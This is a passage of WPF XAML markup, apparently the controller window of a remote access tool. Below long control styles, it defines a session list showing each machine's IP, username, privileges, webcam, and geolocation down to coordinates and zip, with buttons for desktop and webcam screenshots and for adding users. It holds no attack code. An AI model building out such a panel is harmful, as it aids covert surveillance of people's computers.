        <Style x:Key="{x:Type ListView}" TargetType="ListView">
            <Setter Property="SnapsToDevicePixels" Value="true" />
            <Setter Property="OverridesDefaultStyle" Value="true" />
            <Setter Property="ScrollViewer.HorizontalScrollBarVisibility" Value="Auto" />
            <Setter Property="ScrollViewer.VerticalScrollBarVisibility" Value="Auto" />
            <Setter Property="ScrollViewer.CanContentScroll" Value="true" />
            <Setter Property="VerticalContentAlignment" Value="Center" />
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="ListView">
                        <Border Name="Border" BorderThickness="1">
                            <Border.Background>
                                <SolidColorBrush Color="#24282A" />
                            </Border.Background>
                            <Border.BorderBrush>
                                <SolidColorBrush Color="{StaticResource BorderMediumColor}" />
                            </Border.BorderBrush>
                            <ScrollViewer Style="{DynamicResource {x:Static GridView.GridViewScrollViewerStyleKey}}">
                                <ItemsPresenter />
                            </ScrollViewer>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsGrouping" Value="true">
                                <Setter Property="ScrollViewer.CanContentScroll" Value="false" />
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="false">
                                <Setter TargetName="Border" Property="Background">
                                    <Setter.Value>
                                        <SolidColorBrush Color="{DynamicResource DisabledBorderLightColor}" />
                                    </Setter.Value>
                                </Setter>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <Style x:Key="{x:Type ListViewItem}"
       TargetType="ListViewItem">
            <Setter Property="SnapsToDevicePixels" Value="true" />
            <Setter Property="OverridesDefaultStyle" Value="true" />
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="ListBoxItem">
                        <Border x:Name="Border"
                            Padding="2"
                            SnapsToDevicePixels="true"
                            Background="Transparent">
                            <VisualStateManager.VisualStateGroups>
                                <VisualStateGroup x:Name="CommonStates">
                                    <VisualState x:Name="Normal" />
                                    <VisualState x:Name="MouseOver" />
                                    <VisualState x:Name="Disabled" />
                                </VisualStateGroup>
                                <VisualStateGroup x:Name="SelectionStates">
                                    <VisualState x:Name="Unselected" />
                                    <VisualState x:Name="Selected">
                                        <Storyboard>
                                            <ColorAnimationUsingKeyFrames Storyboard.TargetName="Border"
                                                Storyboard.TargetProperty="(Panel.Background).(SolidColorBrush.Color)">
                                                <EasingColorKeyFrame KeyTime="0" Value="{StaticResource SelectedBackgroundColor}" />
                                            </ColorAnimationUsingKeyFrames>
                                        </Storyboard>
                                    </VisualState>
                                    <VisualState x:Name="SelectedUnfocused">
                                        <Storyboard>
                                            <ColorAnimationUsingKeyFrames Storyboard.TargetName="Border"
                                                Storyboard.TargetProperty="(Panel.Background).(SolidColorBrush.Color)">
                                                <EasingColorKeyFrame KeyTime="0" Value="{StaticResource SelectedUnfocusedColor}" />
                                            </ColorAnimationUsingKeyFrames>
                                        </Storyboard>
                                    </VisualState>
                                </VisualStateGroup>
                            </VisualStateManager.VisualStateGroups>
                            <GridViewRowPresenter VerticalAlignment="{TemplateBinding VerticalContentAlignment}" />
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- ListView Style -->
        <!--<SolidColorBrush x:Key="ListBorder" Color="#828790"/>
        <Style x:Key="MyListViewStyle" TargetType="{x:Type ListView}">
            <Setter Property="Background" Value="{DynamicResource {x:Static SystemColors.WindowBrushKey}}"/>
            <Setter Property="BorderBrush" Value="{StaticResource ListBorder}"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Foreground" Value="#FF042271"/>
            <Setter Property="ScrollViewer.HorizontalScrollBarVisibility" Value="Auto"/>
            <Setter Property="ScrollViewer.VerticalScrollBarVisibility" Value="Auto"/>
            <Setter Property="ScrollViewer.CanContentScroll" Value="True"/>
            <Setter Property="ScrollViewer.PanningMode" Value="Both"/>
            <Setter Property="Stylus.IsFlicksEnabled" Value="False"/>
            <Setter Property="VerticalContentAlignment" Value="Center"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type ListView}">
                        <themes:ListBoxChrome x:Name="Bd" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" 
                                              Background="{TemplateBinding Background}" RenderMouseOver="{TemplateBinding IsMouseOver}" 
                                              RenderFocused="{TemplateBinding IsKeyboardFocusWithin}" SnapsToDevicePixels="true">
                            <ScrollViewer Padding="{TemplateBinding Padding}" 
                                          Style="{DynamicResource {x:Static GridView.GridViewScrollViewerStyleKey}}">
                                <ItemsPresenter SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
                            </ScrollViewer>
                        </themes:ListBoxChrome>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsEnabled" Value="false">
                                <Setter Property="Background" TargetName="Bd" Value="{DynamicResource {x:Static SystemColors.ControlBrushKey}}"/>
                            </Trigger>
                            <MultiTrigger>
                                <MultiTrigger.Conditions>
                                    <Condition Property="IsGrouping" Value="true"/>
                                    <Condition Property="VirtualizingPanel.IsVirtualizingWhenGrouping" Value="false"/>
                                </MultiTrigger.Conditions>
                                <Setter Property="ScrollViewer.CanContentScroll" Value="False"/>
                            </MultiTrigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>-->

        <!--ListViewItemStyle-->
        <Style x:Key="ListViewItemStyle" TargetType="{x:Type ListViewItem}">
            <Setter Property="SnapsToDevicePixels" Value="true"/>
            <Setter Property="OverridesDefaultStyle" Value="true"/>
            <Setter Property="Foreground" Value="#FF60D8BD"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type ListBoxItem}">
                        <Border x:Name="Border" Style="{StaticResource BorderBrushStyle}" Padding="2" SnapsToDevicePixels="true" RenderOptions.EdgeMode="Aliased"  Background="Transparent">
                            <GridViewRowPresenter VerticalAlignment="{TemplateBinding VerticalContentAlignment}"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsSelected" Value="true">
                                <Setter TargetName="Border" Property="Background" Value="{StaticResource SelectedViewItemBackgroundBrush}"/>
                                <Setter Property="Foreground" Value="AliceBlue"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="false">
                                <Setter Property="Foreground" Value="{StaticResource DisabledForegroundBrush}"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!--ToolBar Template Copy-->
        <SolidColorBrush x:Key="ToolBarHorizontalBackground" Color="#FFEEF5FD"/>
        <SolidColorBrush x:Key="ToolBarToggleButtonVerticalBackground" Color="#FFEEF5FD"/>
        <SolidColorBrush x:Key="ToolBarButtonHover" Color="#210080FF"/>
        <SolidColorBrush x:Key="ToolBarGripper" Color="#FF6D6D6D"/>
        <Style x:Key="ToolBarVerticalOverflowButtonStyle" TargetType="{x:Type ToggleButton}">
            <Setter Property="Background" Value="{StaticResource ToolBarToggleButtonVerticalBackground}"/>
            <Setter Property="MinHeight" Value="0"/>
            <Setter Property="MinWidth" Value="0"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type ToggleButton}">
                        <Border x:Name="Bd" SnapsToDevicePixels="true" CornerRadius="0,0,3,3" Background="{TemplateBinding Background}">
                            <Canvas Width="7" VerticalAlignment="Bottom" SnapsToDevicePixels="true" Margin="2,7,2,2" Height="6" HorizontalAlignment="Right">
                                <Path Data="M 1.5 1 L 1.5 6" Stroke="White"/>
                                <Path Data="M 0.5 0 L 0.5 5" Stroke="{TemplateBinding Foreground}"/>
                                <Path Data="M 3.5 0.5 L 7 3.5 L 4 6.5 Z" Fill="White"/>
                                <Path Data="M 3 -0.5 L 6 2.5 L 3 5.5 Z" Fill="{TemplateBinding Foreground}"/>
                            </Canvas>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="true">
                                <Setter Property="Background" TargetName="Bd" Value="{StaticResource ToolBarButtonHover}"/>
                            </Trigger>
                            <Trigger Property="IsKeyboardFocused" Value="true">
                                <Setter Property="Background" TargetName="Bd" Value="{StaticResource ToolBarButtonHover}"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="false">
                                <Setter Property="Foreground" Value="{StaticResource ToolBarGripper}"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <DataTrigger Binding="{Binding Source={x:Static SystemParameters.HighContrast}}" Value="true">
                    <Setter Property="Background" Value="{DynamicResource {x:Static SystemColors.ControlBrushKey}}"/>
                </DataTrigger>
            </Style.Triggers>
        </Style>
        <SolidColorBrush x:Key="ToolBarVerticalBackground" Color="#FFEEF5FD"/>
        <SolidColorBrush x:Key="ToolBarToggleButtonHorizontalBackground" Color="#25384D"/>
        <Style x:Key="ToolBarHorizontalOverflowButtonStyle" TargetType="{x:Type ToggleButton}">
            <Setter Property="Background" Value="{StaticResource ToolBarToggleButtonHorizontalBackground}"/>
            <Setter Property="MinHeight" Value="0"/>
            <Setter Property="MinWidth" Value="0"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type ToggleButton}">
                        <Border x:Name="Bd" SnapsToDevicePixels="true" CornerRadius="0,3,3,0" Background="{TemplateBinding Background}">
                            <Canvas Width="6" VerticalAlignment="Bottom" SnapsToDevicePixels="true" Margin="7,2,2,2" Height="7" HorizontalAlignment="Right">
                                <Path Data="M 1 1.5 L 6 1.5" Stroke="White"/>
                                <Path Data="M 0 0.5 L 5 0.5" Stroke="{TemplateBinding Foreground}"/>
                                <Path Data="M 0.5 4 L 6.5 4 L 3.5 7 Z" Fill="White"/>
                                <Path Data="M -0.5 3 L 5.5 3 L 2.5 6 Z" Fill="{TemplateBinding Foreground}"/>
                            </Canvas>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="true">
                                <Setter Property="Background" TargetName="Bd" Value="{StaticResource ToolBarButtonHover}"/>
                            </Trigger>
                            <Trigger Property="IsKeyboardFocused" Value="true">
                                <Setter Property="Background" TargetName="Bd" Value="{StaticResource ToolBarButtonHover}"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="false">
                                <Setter Property="Foreground" Value="{StaticResource ToolBarGripper}"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <DataTrigger Binding="{Binding Source={x:Static SystemParameters.HighContrast}}" Value="true">
                    <Setter Property="Background" Value="{DynamicResource {x:Static SystemColors.ControlBrushKey}}"/>
                </DataTrigger>
            </Style.Triggers>
        </Style>
        <SolidColorBrush x:Key="ToolBarMenuBorder" Color="#FFB6BDC5"/>
        <SolidColorBrush x:Key="ToolBarSubMenuBackground" Color="#FFEEF5FD"/>
        <Style x:Key="ToolBarThumbStyle" TargetType="{x:Type Thumb}">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type Thumb}">
                        <Border SnapsToDevicePixels="True" Padding="{TemplateBinding Padding}" Background="Transparent">
                            <Rectangle>
                                <Rectangle.Fill>
                                    <DrawingBrush ViewboxUnits="Absolute" ViewportUnits="Absolute" Viewport="0,0,4,4" Viewbox="0,0,4,4" TileMode="Tile">
                                        <DrawingBrush.Drawing>
                                            <DrawingGroup>
                                                <GeometryDrawing Brush="White" Geometry="M 1 1 L 1 3 L 3 3 L 3 1 z"/>
                                                <GeometryDrawing Brush="{StaticResource ToolBarGripper}" Geometry="M 0 0 L 0 2 L 2 2 L 2 0 z"/>
                                            </DrawingGroup>
                                        </DrawingBrush.Drawing>
                                    </DrawingBrush>
                                </Rectangle.Fill>
                            </Rectangle>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="true">
                                <Setter Property="Cursor" Value="SizeAll"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style x:Key="ToolBarMainPanelBorderStyle" TargetType="{x:Type Border}">
            <Setter Property="Margin" Value="0,0,11,0"/>
            <Setter Property="CornerRadius" Value="3,3,3,3"/>
            <Style.Triggers>
                <DataTrigger Binding="{Binding Source={x:Static SystemParameters.HighContrast}}" Value="true">
                    <Setter Property="CornerRadius" Value="0,0,0,0"/>
                </DataTrigger>
            </Style.Triggers>
        </Style>
        <Style x:Key="ToolBarStyle1" TargetType="{x:Type ToolBar}">
            <Setter Property="Background" Value="{StaticResource ToolBarHorizontalBackground}"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type ToolBar}">
                        <Grid x:Name="Grid" Margin="3,1,1,1" SnapsToDevicePixels="true">
                            <Grid x:Name="OverflowGrid" HorizontalAlignment="Right">
                                <ToggleButton x:Name="OverflowButton" ClickMode="Press" FocusVisualStyle="{x:Null}" IsChecked="{Binding IsOverflowOpen, Mode=TwoWay, RelativeSource={RelativeSource TemplatedParent}}" IsEnabled="{TemplateBinding HasOverflowItems}" Style="{StaticResource ToolBarHorizontalOverflowButtonStyle}"/>
                                <Popup x:Name="OverflowPopup" AllowsTransparency="true" Focusable="false" IsOpen="{Binding IsOverflowOpen, RelativeSource={RelativeSource TemplatedParent}}" PopupAnimation="{DynamicResource {x:Static SystemParameters.ComboBoxPopupAnimationKey}}" Placement="Bottom" StaysOpen="false">
                                    <themes:SystemDropShadowChrome x:Name="Shdw" Color="Transparent">
                                        <Border x:Name="ToolBarSubMenuBorder" BorderBrush="{StaticResource ToolBarMenuBorder}" BorderThickness="1" Background="{StaticResource ToolBarSubMenuBackground}" RenderOptions.ClearTypeHint="Enabled">
                                            <ToolBarOverflowPanel x:Name="PART_ToolBarOverflowPanel" KeyboardNavigation.DirectionalNavigation="Cycle" FocusVisualStyle="{x:Null}" Focusable="true" Margin="2" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}" KeyboardNavigation.TabNavigation="Cycle" WrapWidth="200"/>

                                        </Border>
                                    </themes:SystemDropShadowChrome>
                                </Popup>
                            </Grid>
                            <Border x:Name="MainPanelBorder" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}" Padding="{TemplateBinding Padding}" Style="{StaticResource ToolBarMainPanelBorderStyle}">
                                <DockPanel KeyboardNavigation.TabIndex="1" KeyboardNavigation.TabNavigation="Local">
                                    <Thumb x:Name="ToolBarThumb" Margin="-3,-1,0,0" Padding="6,5,1,6" Style="{StaticResource ToolBarThumbStyle}" Width="10"/>
                                    <ContentPresenter x:Name="ToolBarHeader" ContentSource="Header" HorizontalAlignment="Center" Margin="4,0,4,0" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}" VerticalAlignment="Center"/>
                                    <ToolBarPanel x:Name="PART_ToolBarPanel" IsItemsHost="true" Margin="0,1,2,2" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
                                </DockPanel>
                            </Border>
                        </Grid>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsOverflowOpen" Value="true">
                                <Setter Property="IsEnabled" TargetName="ToolBarThumb" Value="false"/>
                            </Trigger>
                            <Trigger Property="Header" Value="{x:Null}">
                                <Setter Property="Visibility" TargetName="ToolBarHeader" Value="Collapsed"/>
                            </Trigger>
                            <Trigger Property="ToolBarTray.IsLocked" Value="true">
                                <Setter Property="Visibility" TargetName="ToolBarThumb" Value="Collapsed"/>
                            </Trigger>
                            <Trigger Property="HasDropShadow" SourceName="OverflowPopup" Value="true">
                                <Setter Property="Margin" TargetName="Shdw" Value="0,0,5,5"/>
                                <Setter Property="SnapsToDevicePixels" TargetName="Shdw" Value="true"/>
                                <Setter Property="Color" TargetName="Shdw" Value="#71000000"/>
                            </Trigger>
                            <Trigger Property="Orientation" Value="Vertical">
                                <Setter Property="Margin" TargetName="Grid" Value="1,3,1,1"/>
                                <Setter Property="Style" TargetName="OverflowButton" Value="{StaticResource ToolBarVerticalOverflowButtonStyle}"/>
                                <Setter Property="Height" TargetName="ToolBarThumb" Value="10"/>
                                <Setter Property="Width" TargetName="ToolBarThumb" Value="Auto"/>
                                <Setter Property="Margin" TargetName="ToolBarThumb" Value="-1,-3,0,0"/>
                                <Setter Property="Padding" TargetName="ToolBarThumb" Value="5,6,6,1"/>
                                <Setter Property="Margin" TargetName="ToolBarHeader" Value="0,0,0,4"/>
                                <Setter Property="Margin" TargetName="PART_ToolBarPanel" Value="1,0,2,2"/>
                                <Setter Property="DockPanel.Dock" TargetName="ToolBarThumb" Value="Top"/>
                                <Setter Property="DockPanel.Dock" TargetName="ToolBarHeader" Value="Top"/>
                                <Setter Property="HorizontalAlignment" TargetName="OverflowGrid" Value="Stretch"/>
                                <Setter Property="VerticalAlignment" TargetName="OverflowGrid" Value="Bottom"/>
                                <Setter Property="Placement" TargetName="OverflowPopup" Value="Right"/>
                                <Setter Property="Margin" TargetName="MainPanelBorder" Value="0,0,0,11"/>
                                <Setter Property="Background" Value="{StaticResource ToolBarVerticalBackground}"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="false">
                                <Setter Property="Foreground" Value="{DynamicResource {x:Static SystemColors.GrayTextBrushKey}}"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <DataTrigger Binding="{Binding Source={x:Static SystemParameters.HighContrast}}" Value="true">
                    <Setter Property="Background" Value="{DynamicResource {x:Static SystemColors.ControlBrushKey}}"/>
                </DataTrigger>
            </Style.Triggers>
        </Style>

    </Window.Resources>

    <DockPanel LastChildFill="True">
        <Menu x:Name="menu" DockPanel.Dock="Top" VerticalAlignment="Top" RenderTransformOrigin="0.502,0.474" VerticalContentAlignment="Top" HorizontalContentAlignment="Stretch">
            <Menu.Resources>
                <DropShadowEffect x:Key="dropShadow" BlurRadius="6" Direction="315" />
                <Style x:Key="MenuItemStyle" TargetType="{x:Type MenuItem}">
                    <Setter Property="VerticalContentAlignment" Value="Stretch"/>
                    <Setter Property="HorizontalAlignment" Value="Left"/>
                    <Setter Property="Foreground" Value="White"/>
                    <Setter Property="HorizontalContentAlignment" Value="Left"/>
                    <Setter Property="FontSize" Value="12"/>
                    <Setter Property="Padding" Value="8,6,8,6"/>
                    <Setter Property="Effect" Value="{StaticResource dropShadow}"/>
                </Style>

                <ControlTemplate x:Key="MyMenuItemTemplate" TargetType="{x:Type MenuItem}">
                    <Border x:Name="templateRoot" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}" SnapsToDevicePixels="True">
                        <Grid VerticalAlignment="Center">
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="Auto"/>
                                <ColumnDefinition Width="Auto"/>
                            </Grid.ColumnDefinitions>
                            <ContentPresenter x:Name="Icon" Content="{TemplateBinding Icon}" ContentSource="Icon" HorizontalAlignment="Center" Height="16" Margin="3" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}" VerticalAlignment="Center" Width="16" Visibility="Visible" Opacity="1"/>
                            <Path x:Name="GlyphPanel" Data="F1M10,1.2L4.7,9.1 4.5,9.1 0,5.2 1.3,3.5 4.3,6.1 8.3,0 10,1.2z" Fill="#FF212121" FlowDirection="LeftToRight" Margin="3" Visibility="Collapsed" VerticalAlignment="Center"/>
                            <ContentPresenter ContentTemplate="{TemplateBinding HeaderTemplate}" Content="{TemplateBinding Header}" Grid.Column="1" ContentStringFormat="{TemplateBinding HeaderStringFormat}" ContentSource="Header" Margin="{TemplateBinding Padding}" RecognizesAccessKey="True" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
                        </Grid>
                    </Border>
                    <ControlTemplate.Triggers>
                        <Trigger Property="Icon" Value="{x:Null}">
                            <Setter Property="Visibility" TargetName="Icon" Value="Collapsed"/>
                        </Trigger>
                        <Trigger Property="IsChecked" Value="True">
                            <Setter Property="Visibility" TargetName="GlyphPanel" Value="Visible"/>
                            <Setter Property="Visibility" TargetName="Icon" Value="Collapsed"/>
                        </Trigger>
                        <Trigger Property="IsHighlighted" Value="True">
                            <Setter Property="TextElement.Foreground"  TargetName="templateRoot" Value="#FF8AFAFF"/>
                            <!--<Setter Property="BorderBrush" TargetName="templateRoot" Value="#FF088D20"/>-->
                        </Trigger>
                        <Trigger Property="IsEnabled" Value="False">
                            <Setter Property="TextElement.Foreground" TargetName="templateRoot" Value="White"/>
                            <Setter Property="Fill" TargetName="GlyphPanel" Value="#FF8F5858"/>
                        </Trigger>
                        <MultiTrigger>
                            <MultiTrigger.Conditions>
                                <Condition Property="IsHighlighted" Value="True"/>
                                <Condition Property="IsEnabled" Value="False"/>
                            </MultiTrigger.Conditions>
                            <Setter Property="Background" TargetName="templateRoot" Value="#0A000000"/>
                            <Setter Property="BorderBrush" TargetName="templateRoot" Value="#21000000"/>
                        </MultiTrigger>
                    </ControlTemplate.Triggers>
                </ControlTemplate>
            </Menu.Resources>
            <Menu.Background>
                <LinearGradientBrush EndPoint="0.5,1" MappingMode="RelativeToBoundingBox" StartPoint="0.5,0">
                    <GradientStop Color="#FF27353C" Offset="0"/>
                    <GradientStop Color="#FF24282A" Offset="0.958"/>
                    <GradientStop Color="#FF5F9393" Offset="0.238"/>
                </LinearGradientBrush>
            </Menu.Background>

            <MenuItem Header="File" Template="{StaticResource MyMenuItemTemplate}" Style="{StaticResource MenuItemStyle}"/>
            <MenuItem Header="Edit" Template="{StaticResource MyMenuItemTemplate}" Style="{StaticResource MenuItemStyle}"/>
            <MenuItem Header="View" Template="{StaticResource MyMenuItemTemplate}" Style="{StaticResource MenuItemStyle}"/>
            <MenuItem Header="Bind" Template="{StaticResource MyMenuItemTemplate}" Style="{StaticResource MenuItemStyle}"/>
            <MenuItem Header="Command Promt" Template="{StaticResource MyMenuItemTemplate}" Style="{StaticResource MenuItemStyle}"/>
            <MenuItem Header="Help" Template="{StaticResource MyMenuItemTemplate}" Style="{StaticResource MenuItemStyle}"/>
        </Menu>

        <ToolBarPanel MinHeight="35" DockPanel.Dock="Bottom">
            <ToolBar Band="0" BandIndex="0" Margin="0,5,0,0" Style="{DynamicResource ToolBarStyle1}">
                <ToolBar.Background>
                    <RadialGradientBrush>
                        <GradientStop Color="#FF233244" Offset="0.49"/>
                        <GradientStop Color="#FF2B4564" Offset="1"/>
                        <GradientStop Color="#FF223040" Offset="0.029"/>
                    </RadialGradientBrush>
                </ToolBar.Background>
                <Button x:Name="Start" Click="btnStart_Clicked">
                    <Image Source="app_resources/start.png" Height="16" Width="16" Stretch="Uniform"/>
                </Button>
                <Button x:Name="Stop" Click="btnStop_Clicked">
                    <Image Source="app_resources/stop.png" Stretch="Uniform" Width="16" Height="16"/>
                </Button>
                <Button x:Name="IP" Click="btnIP_Clicked">
                    <Image Source="app_resources/ip.png" Height="16" Width="16" Stretch="Uniform"/>
                </Button>
                <Button x:Name="Cancel" Click="btnCancel_Clicked">
                    <Image Source="app_resources/cancel.png" Height="16" Width="16" Stretch="Uniform"/>
                </Button>
                <Label x:Name="LabelAppStatus" Content="App Status" Foreground="#FF0CFB42" HorizontalContentAlignment="Right" Margin="700,0,0,0" Padding="0" VerticalContentAlignment="Center" VerticalAlignment="Center" HorizontalAlignment="Left" Width="400"/>

            </ToolBar>
        </ToolBarPanel>

        <Grid x:Name="MainGrid" MinHeight="600">
            <Grid.RowDefinitions>
                <RowDefinition Height="*"/>
            </Grid.RowDefinitions>
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="0.15*"/>
                <ColumnDefinition Width="*"/>
                <ColumnDefinition Width="0.3*"/>
            </Grid.ColumnDefinitions>
            <ListView x:Name="SessionListView" SelectedItem="{Binding SelectedSession, Mode=TwoWay}" 
                      SelectedIndex="0" Grid.Column="1" Margin="0" Background="#FF24282A"
                      >

                <ListView.ItemContainerStyle>
                    <Style BasedOn="{StaticResource ListViewItemStyle}" TargetType="{x:Type ListViewItem}"/>
                </ListView.ItemContainerStyle>
                <ListView.View>
                    <GridView>
                        <GridView.ColumnHeaderContainerStyle>
                            <Style TargetType="{x:Type GridViewColumnHeader}">
                                <Setter Property="Background" Value="#24282A" />
                                <Setter Property="Foreground" Value="#FFFFFF" />
                                <Style.Triggers>
                                    <Trigger Property="IsMouseOver" Value="False">
                                        <Setter Property="Foreground" Value="White"/>
                                    </Trigger>
                                    <Trigger Property="IsMouseOver" Value="True">
                                        <Setter Property="Foreground" Value="Black"/>
                                    </Trigger>
                                </Style.Triggers>
                            </Style>
                        </GridView.ColumnHeaderContainerStyle>
                        <GridViewColumn Header="ID" DisplayMemberBinding="{Binding ID}" Width="30"/>
                        <GridViewColumn Header="WAN.IP" DisplayMemberBinding="{Binding WANIP}" Width="100"/>
                        <GridViewColumn Header="LOCAL.IP" DisplayMemberBinding="{Binding LOCALIP}" Width="100"/>
                        <GridViewColumn Header="Username" DisplayMemberBinding="{Binding Username}" Width="100"/>
                        <GridViewColumn Header="Comp.Name" DisplayMemberBinding="{Binding ComputerName}" Width="100"/>
                        <GridViewColumn Header="Privileges" DisplayMemberBinding="{Binding Privileges}" Width="70"/>
                        <GridViewColumn Header="OS" DisplayMemberBinding="{Binding OS}" Width="100"/>
                        <GridViewColumn Header="Uptime" DisplayMemberBinding="{Binding Uptime}" Width="100"/>
                        <GridViewColumn Header="Cam" DisplayMemberBinding="{Binding Cam}" Width="50"/>
                        <GridViewColumn Header="Install Date" DisplayMemberBinding="{Binding InstallDate}" Width="100"/>
                        <GridViewColumn Header="Country" DisplayMemberBinding="{Binding Country}" Width="100"/>
                        <GridViewColumn Header="Region Name" DisplayMemberBinding="{Binding RegionName}" Width="100"/>
                        <GridViewColumn Header="City" DisplayMemberBinding="{Binding City}" Width="100"/>
                        <GridViewColumn Header="ISP" DisplayMemberBinding="{Binding Isp}" Width="100"/>
                        <GridViewColumn Header="Coords" DisplayMemberBinding="{Binding Coords}" Width="100"/>
                        <GridViewColumn Header="Zip" DisplayMemberBinding="{Binding Zip}" Width="100"/>
                    </GridView>
                </ListView.View>
            </ListView>

            <GroupBox x:Name="groupBoxRight" Grid.Column="2" Header="Infomation" Margin="5,2,5,0" HorizontalContentAlignment="Center">
                <Grid Margin="5,10" ShowGridLines="False">
                    <Grid.RowDefinitions>
                        <RowDefinition Height="auto"/>
                        <RowDefinition Height="0.3*"/>
                        <RowDefinition Height="0.3*"/>
                    </Grid.RowDefinitions>
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                    </Grid.ColumnDefinitions>
                    <Thumb x:Name="thumbScreen" Grid.Column="0" Grid.Row="0" Height="200" Margin="0,10,0,0" Width="200" VerticalAlignment="Top"/>
                    <CheckBox Content="Session Thumbnail" Foreground="AliceBlue" Grid.Column="0" Grid.Row="0" Margin="10,215,0,0"/>
                    <StackPanel x:Name="StackPanelThumbnail" Grid.Column="0" Grid.Row="0" Margin="10,235,0,20">
                        <Label x:Name="label" Content="Thumbnail refresh rate" Foreground="AliceBlue"/>
                        <Slider x:Name="slider" HorizontalAlignment="Left"  VerticalAlignment="Top" Width="200" Margin="0,0,0,0"/>
                    </StackPanel>

                    <StackPanel  x:Name="StackPanelRightOptions" Grid.Column="0" Grid.Row="1" MinHeight="80" VerticalAlignment="Top">
                        <Button x:Name="btnDesktopScreen" Content="Take Desktop Screen" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnDesktopScreen_Clicked"/>
                        <Button x:Name="btnWebcamScreen" Content="Webcam Screenshot" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnWebcamScreen_Clicked"/>
                        <Button x:Name="btnAddUser" Content="Add user" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnAddUser_Clicked"/>
                        <Button x:Name="btnRemoveUser" Content="Remove user" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnRemoveUser_Clicked"/>
                    </StackPanel>

                    <GroupBox x:Name="groupBoxNetworkStatistics" Header="Network"  Grid.Row="2" Margin="5,2,5,0" HorizontalContentAlignment="Center">
                        <Grid x:Name="gridNetworkStatistics" Margin="5,10" ShowGridLines="True">
                            <Grid.RowDefinitions>
                                <RowDefinition Height="*"/>
                            </Grid.RowDefinitions>
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="*"/>
                            </Grid.ColumnDefinitions>
                            <StackPanel x:Name="StackPanelStatistics" Grid.Column="0" Grid.Row="0" MinHeight="80" VerticalAlignment="Top">

                                <StackPanel Orientation="Horizontal">
                                    <Label x:Name="In" Content="In:" Foreground="AliceBlue"  HorizontalAlignment="Center" Margin="0" Grid.Row="2" VerticalAlignment="Center"/>
                                    <TextBox x:Name="txtBoxIn" Text ="{Binding Path=SelectedSession.Incoming}" Foreground="AliceBlue" Height="20" Background="#24282A"  IsReadOnly="True" HorizontalAlignment="Left" Width="90" Margin="10,0,0,0"/>
                                    <Label x:Name="inSizeUnits" Content="KiB" Foreground="AliceBlue"  HorizontalAlignment="Center" Margin="0" Grid.Row="2" VerticalAlignment="Center"/>

                                </StackPanel>
                                <StackPanel Orientation="Horizontal">
                                    <Label x:Name="Out" Content="Out:" Foreground="AliceBlue"  HorizontalAlignment="Center" Margin="0" Grid.Row="2" VerticalAlignment="Center"/>
